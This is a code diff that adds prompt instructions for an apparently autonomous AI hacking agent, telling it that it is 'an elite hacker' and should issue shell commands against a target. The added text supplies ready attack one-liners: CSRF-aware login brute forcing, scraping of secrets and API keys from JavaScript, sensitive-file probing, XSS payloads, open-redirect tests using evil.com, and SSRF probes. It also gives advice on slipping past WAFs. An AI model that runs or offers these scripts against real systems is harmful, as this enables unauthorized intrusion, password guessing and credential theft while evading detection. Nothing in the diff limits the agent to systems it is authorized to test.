@@ -243,12 +243,36 @@ ABSOLUTE RULES:
 10. curl: -sk --max-time 15
 11. If sqlmap needs CSRF: use --csrf-token and --threads=1 (not 10)
 12. Hydra for web: get fresh CSRF token each time or it gives false positives
+13. PREFER writing custom bash/python scripts over basic tool commands
 
-INSTALLED TOOLS: nmap, nikto, sqlmap, nuclei, ffuf, gobuster, curl, dig, whois, host, assetfinder, hydra, searchsploit, wpscan, sslscan, openssl, dirsearch, grep, jq
+INSTALLED TOOLS: nmap, nikto, sqlmap, nuclei, ffuf, gobuster, curl, dig, whois, host, assetfinder, hydra, searchsploit, wpscan, sslscan, openssl, dirsearch, grep, jq, python3, bash, sed, awk
 NOT INSTALLED: httpx(Go), dalfox, xsstrike, hakrawler, paramspider, gau, qsreplace, gospider, subfinder, testssl.sh, sublist3r, amass, waybackurls, wapiti, shodan
 
+=== ADVANCED SCRIPTING (USE THIS! Better than basic tools) ===
+Write custom scripts instead of relying on basic tool commands:
+
+CRAWL & EXTRACT LINKS: bash -c 'curl -sk https://{target}/ | grep -oP "(href|src)=\"[^\"]+\"" | sort -u'
+FIND JS FILES & SECRETS: bash -c 'for js in $(curl -sk https://{target}/ | grep -oP "src=\"[^\"]+\\.js\"" | grep -oP "\"[^\"]+\"" | tr -d \'\"\'); do echo "==$js=="; curl -sk "https://{target}/$js" 2>/dev/null | grep -oiE "(api[_-]?key|token|secret|password|authorization|firebase|aws_)[a-zA-Z0-9_]*[=:][^\"\' ]+" | head -20; done'
+PARAMETER FUZZING: bash -c 'for p in id user admin page file path cmd search query url redirect next callback; do r=$(curl -sk -o /dev/null -w "%{{http_code}}:%{{size_download}}" "https://{target}/page?$p=test123" --max-time 10); echo "$p -> $r"; done'
+CSRF-AWARE LOGIN BRUTE: bash -c 'for pw in admin password 123456 admin123 letmein master; do TOKEN=$(curl -sk https://{target}/login -c /tmp/zcookie | grep -oP "name=\"_token\" value=\"\\K[^\"]+"); RESP=$(curl -sk -X POST https://{target}/login -b /tmp/zcookie -d "email=admin@{target}&password=$pw&_token=$TOKEN" -w "\n%{{http_code}}" -o /tmp/zbody --max-time 15); CODE=$(echo "$RESP" | tail -1); SIZE=$(wc -c < /tmp/zbody); echo "$pw -> HTTP $CODE (size: $SIZE)"; done'
+SECURITY HEADER CHECK: bash -c 'H=$(curl -skI https://{target}/); echo "$H" | head -20; echo "---MISSING HEADERS---"; for h in X-Frame-Options Content-Security-Policy X-XSS-Protection Strict-Transport-Security X-Content-Type-Options; do echo "$H" | grep -qi "$h" || echo "MISSING: $h"; done'
+SUBDOMAIN BRUTE: bash -c 'for sub in www mail ftp admin dev staging api test vpn portal app cdn; do ip=$(dig +short $sub.{target} 2>/dev/null | head -1); [ -n "$ip" ] && echo "FOUND: $sub.{target} -> $ip"; done'
+DIR ENUM CUSTOM: bash -c 'for p in .env .git/HEAD wp-config.php.bak robots.txt sitemap.xml .htaccess server-status info.php phpinfo.php api/v1 graphql .well-known/security.txt debug trace web.config; do CODE=$(curl -sk -o /dev/null -w "%{{http_code}}" "https://{target}/$p" --max-time 10); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "$p -> $CODE"; done'
+XSS PROBE: bash -c 'PAYLOADS=(\'<script>alert(1)</script>\' \'"onmouseover=alert(1)\' \'\'\'><img src=x onerror=alert(1)>\' \'javascript:alert(1)\'); for param in $(curl -sk https://{target}/ | grep -oP "name=\"\\K[^\"]+" | sort -u); do for pay in "${{PAYLOADS[@]}}"; do RESP=$(curl -sk "https://{target}/?$param=$pay" --max-time 10); echo "$RESP" | grep -q "alert(1)" && echo "POSSIBLE XSS: $param with $pay"; done; done'
+PYTHON SCANNER: python3 -c "import urllib.request,ssl,json; ctx=ssl._create_unverified_context(); [print(f'{{p}}: {{urllib.request.urlopen(f\"https://{target}/{{p}}\",context=ctx).status}}') for p in ['.env','debug','trace','api','graphql','wp-json/wp/v2/users','server-info','.git/config'] if (lambda u: (True, urllib.request.urlopen(u,context=ctx).status))(f'https://{target}/{{p}}')]"
+WAYBACK ENUM: bash -c 'curl -s "http://web.archive.org/cdx/search/cdx?url={target}/*&output=text&fl=original&collapse=urlkey" 2>/dev/null | head -50 | sort -u'
+OPEN REDIRECT TEST: bash -c 'for param in url redirect next callback return_to goto dest destination rurl; do for target_url in "https://evil.com" "//evil.com" "/\\evil.com"; do CODE=$(curl -sk -o /dev/null -w "%{{http_code}}" "https://{target}/?$param=$target_url" --max-time 10); [ "$CODE" = "301" ] || [ "$CODE" = "302" ] && echo "POSSIBLE REDIRECT: $param=$target_url -> $CODE"; done; done'
+SSRF PROBE: bash -c 'for param in url file path page load fetch src dest redirect; do RESP=$(curl -sk "https://{target}/?$param=http://127.0.0.1:22" -w "\n%{{http_code}}" --max-time 10); echo "$param -> $(echo $RESP | tail -1)"; done'
+
+ALWAYS prefer scripts when:
+- Basic tools fail or timeout
+- Need multi-step logic (get token → use token → check result)
+- Need to chain results (find URLs → test each one)
+- WAF blocks standard tools (custom curl bypasses WAF signatures)
+- Need to test specific parameters or endpoints
+
 RESPOND JSON ONLY:
-{{"reasoning":"why","action":"COMMAND","command":"linux cmd","phase":"{phase}","expected_outcome":"what"}}
+{{"reasoning":"why","action":"COMMAND","command":"linux cmd or bash script","phase":"{phase}","expected_outcome":"what"}}
 OR: {{"reasoning":"done","action":"GOAL_ACHIEVED","findings_summary":"results","phase":"REPORT"}}
 """
 
@@ -310,8 +334,71 @@ httpx(Go version), dalfox, xsstrike, hakrawler, paramspider, gau, qsreplace, gos
 - Wayback: curl -s "http://web.archive.org/cdx/search/cdx?url=domain.tld/*&output=text&fl=original&collapse=urlkey"
 - Web tech: curl -sI https://target | head -30
 - Exploits: searchsploit service version
-- Check: robots.txt, .git, .env, backup files, admin panels
-- XSS manual: curl -sk "https://target/page?param=<script>alert(1)</script>" | grep -i script
+
+=== ⚡ ADVANCED SCRIPTING (PREFERRED OVER BASIC TOOLS) ===
+You are an elite hacker. Write CUSTOM scripts that are smarter than basic tool runs.
+ALWAYS prefer writing bash/python scripts when possible. They bypass WAFs, handle multi-step logic, and give better results.
+
+--- WEB CRAWLING & LINK EXTRACTION ---
+bash -c 'curl -sk https://{target}/ | grep -oP "(href|src)=\\"[^\\"]+\\"" | sed "s/href=//;s/src=//;s/\\"//g" | sort -u | while read url; do [[ "$url" == /* ]] && url="https://{target}$url"; echo "$url"; done'
+
+--- FIND JAVASCRIPT FILES & EXTRACT SECRETS ---
+bash -c 'for js in $(curl -sk https://{target}/ | grep -oP "src=\\"[^\\"]+\\.js\\"" | grep -oP "\\"[^\\"]+\\"" | tr -d \'\\"\'); do full_url="$js"; [[ "$js" == /* ]] && full_url="https://{target}$js"; echo "\n=== $full_url ==="; curl -sk "$full_url" 2>/dev/null | grep -oiE "(api[_-]?key|token|secret|password|authorization|firebase|aws_|private[_-]?key|access[_-]?key)[a-zA-Z0-9_]*[\\"\'\'=:][^\\"\'\' ,;}}]+" | head -30; done'
+
+--- SMART PARAMETER DISCOVERY & FUZZING ---
+bash -c 'echo "=== Form Parameters ==="; curl -sk https://{target}/ | grep -oP "name=\\"\\K[^\\"]+" | sort -u; echo "\n=== URL Parameter Fuzz ==="; for p in id user admin page file path cmd search query url redirect next callback action type format debug test; do r=$(curl -sk -o /dev/null -w "%{{http_code}}:%{{size_download}}" "https://{target}/?$p=test123zenith" --max-time 10); echo "$p -> $r"; done'
+
+--- CSRF-AWARE LOGIN BRUTE FORCE (Laravel/PHP) ---
+bash -c 'echo "=== Login Brute Force (CSRF-aware) ==="; for pw in admin password 123456 admin123 letmein master welcome P@ssw0rd root toor changeme; do TOKEN=$(curl -sk https://{target}/login -c /tmp/zcookie 2>/dev/null | grep -oP "name=\\"_token\\" value=\\"\\K[^\\"]+"); if [ -z "$TOKEN" ]; then TOKEN=$(curl -sk https://{target}/login -c /tmp/zcookie 2>/dev/null | grep -oP "csrf[_-]token.*?content=\\"\\K[^\\"]+"); fi; RESP=$(curl -sk -X POST https://{target}/login -b /tmp/zcookie -d "email=admin@{target}&password=$pw&_token=$TOKEN" -w "HTTP_%{{http_code}}_SIZE_%{{size_download}}" -o /tmp/zbody -D /tmp/zheaders --max-time 15 2>/dev/null); CODE=$(echo "$RESP" | grep -oP "HTTP_\\K[0-9]+"); SIZE=$(echo "$RESP" | grep -oP "SIZE_\\K[0-9]+"); REDIR=$(grep -i "location:" /tmp/zheaders 2>/dev/null | head -1); echo "$pw -> HTTP $CODE (size: $SIZE) $REDIR"; sleep 1; done'
+
+--- SECURITY HEADER AUDIT ---
+bash -c 'echo "=== Security Header Analysis ==="; H=$(curl -skI https://{target}/); echo "$H" | head -20; echo "\n--- Missing Security Headers ---"; for h in "X-Frame-Options" "Content-Security-Policy" "X-XSS-Protection" "Strict-Transport-Security" "X-Content-Type-Options" "Referrer-Policy" "Permissions-Policy" "Cross-Origin-Opener-Policy" "Cross-Origin-Resource-Policy"; do echo "$H" | grep -qi "$h" || echo "⚠ MISSING: $h"; done; echo "\n--- Cookie Security ---"; echo "$H" | grep -i set-cookie | while read line; do echo "$line" | grep -qi "httponly" || echo "⚠ Cookie missing HttpOnly"; echo "$line" | grep -qi "secure" || echo "⚠ Cookie missing Secure flag"; echo "$line" | grep -qi "samesite" || echo "⚠ Cookie missing SameSite"; done'
+
+--- SUBDOMAIN BRUTEFORCE ---
+bash -c 'echo "=== Subdomain Bruteforce ==="; for sub in www mail ftp admin dev staging api test vpn portal app cdn beta internal git jenkins ci cd grafana kibana elastic monitor status blog shop store; do ip=$(dig +short $sub.{target} 2>/dev/null | head -1); [ -n "$ip" ] && echo "FOUND: $sub.{target} -> $ip"; done'
+
+--- SENSITIVE FILE DISCOVERY ---
+bash -c 'echo "=== Sensitive File Discovery ==="; for p in .env .git/HEAD .git/config wp-config.php.bak .htaccess .htpasswd server-status server-info info.php phpinfo.php test.php debug trace web.config appsettings.json config.json config.yml config.php database.yml .DS_Store Thumbs.db crossdomain.xml clientaccesspolicy.xml sitemap.xml robots.txt security.txt .well-known/security.txt api/ api/v1 api/v2 graphql swagger swagger/v1/swagger.json api-docs v1/api-docs openapi.json wp-json/wp/v2/users actuator/env actuator/health; do CODE=$(curl -sk -o /tmp/zbody -w "%{{http_code}}:%{{size_download}}" "https://{target}/$p" --max-time 10 2>/dev/null); HTTP=$(echo "$CODE" | cut -d: -f1); SIZE=$(echo "$CODE" | cut -d: -f2); [ "$HTTP" != "404" ] && [ "$HTTP" != "000" ] && [ "$SIZE" != "0" ] && echo "$p -> HTTP $HTTP ($SIZE bytes)"; done'
+
+--- XSS TESTING SCRIPT ---
+bash -c 'echo "=== XSS Testing ==="; PARAMS=$(curl -sk https://{target}/ | grep -oP "name=\\"\\K[^\\"]+" | sort -u); PAYLOADS=(\'<script>alert(1)</script>\' \'"onmouseover="alert(1)"\' \'\'\'><img src=x onerror=alert(1)>\' \'<svg onload=alert(1)>\' \'javascript:alert(1)\'); for param in $PARAMS; do for pay in "${{PAYLOADS[@]}}"; do RESP=$(curl -sk "https://{target}/?$param=$(echo $pay | python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read().strip()))" 2>/dev/null)" --max-time 10 2>/dev/null); echo "$RESP" | grep -q "alert(1)" && echo "⚠ POSSIBLE XSS: param=$param payload=$pay"; done; done'
+
+--- OPEN REDIRECT TESTING ---
+bash -c 'echo "=== Open Redirect Testing ==="; for param in url redirect next callback return_to goto dest destination rurl redirect_url continue return; do for target_url in "https://evil.com" "//evil.com" "/\\\\evil.com" "////evil.com" "https:evil.com"; do RESP=$(curl -sk -D- -o /dev/null "https://{target}/?$param=$target_url" --max-time 10 2>/dev/null); LOC=$(echo "$RESP" | grep -i "^location:" | head -1); CODE=$(echo "$RESP" | head -1 | grep -oP "[0-9]{{3}}"); [ -n "$LOC" ] && echo "⚠ REDIRECT: $param=$target_url -> $CODE $LOC"; done; done'
+
+--- SSRF PROBE ---
+bash -c 'echo "=== SSRF Probe ==="; for param in url file path page load fetch src dest redirect uri data; do RESP=$(curl -sk -o /dev/null -w "%{{http_code}}:%{{size_download}}" "https://{target}/?$param=http://127.0.0.1:22" --max-time 10 2>/dev/null); echo "$param -> $RESP"; done'
+
+--- PYTHON ADVANCED SCANNER ---
+python3 -c "
+import urllib.request, ssl, sys, json
+ctx = ssl._create_unverified_context()
+target = '{target}'
+paths = ['.env', '.git/config', 'debug', 'trace', 'api', 'graphql', 'wp-json/wp/v2/users', 'server-info', 'actuator/env', 'swagger/v1/swagger.json', '.well-known/security.txt']
+for p in paths:
+    try:
+        r = urllib.request.urlopen(f'https://{{target}}/{{p}}', context=ctx, timeout=10)
+        body = r.read(500).decode(errors='ignore')
+        print(f'[{{r.status}}] /{{p}} ({{len(body)}}b): {{body[:100]}}')
+    except urllib.error.HTTPError as e:
+        if e.code != 404: print(f'[{{e.code}}] /{{p}}')
+    except: pass
+"
+
+--- TECHNOLOGY FINGERPRINTING ---
+bash -c 'echo "=== Deep Fingerprint ==="; H=$(curl -skI https://{target}/); echo "SERVER: $(echo "$H" | grep -i ^server: | head -1)"; echo "POWERED: $(echo "$H" | grep -i ^x-powered | head -1)"; BODY=$(curl -sk https://{target}/ | head -100); echo "$BODY" | grep -oiE "(wp-content|wordpress|joomla|drupal|laravel|django|express|rails|angular|react|vue|next|nuxt|jquery-[0-9.]+|bootstrap-[0-9.]+)" | sort -u | while read t; do echo "TECH: $t"; done; echo "GENERATOR: $(echo "$BODY" | grep -oP "content=\\"\\K[^\\"]+" | head -3)"
+
+=== SCRIPTING RULES ===
+1. ALWAYS prefer custom scripts over basic single-tool commands
+2. Write bash -c '...' for multi-step operations
+3. Use python3 -c '...' for complex logic (urllib, json parsing, encoding)
+4. Chain operations: extract → analyze → test in ONE command
+5. Custom scripts bypass WAF because they don't have tool signatures
+6. ALWAYS add --max-time to curl inside scripts (prevents hanging)
+7. Use /tmp/z* for temp files (zcookie, zbody, zheaders, zurls)
+8. For login brute: ALWAYS get fresh CSRF token before EACH attempt
+9. Test MULTIPLE payloads per parameter, not just one
+10. Extract info from responses (headers, body, status codes, sizes)
 
 === RESPOND WITH JSON ONLY ===
 {{"reasoning":"brief analysis","action":"COMMAND","command":"linux command (NO proxychains!)","phase":"{phase}","expected_outcome":"what we expect"}}
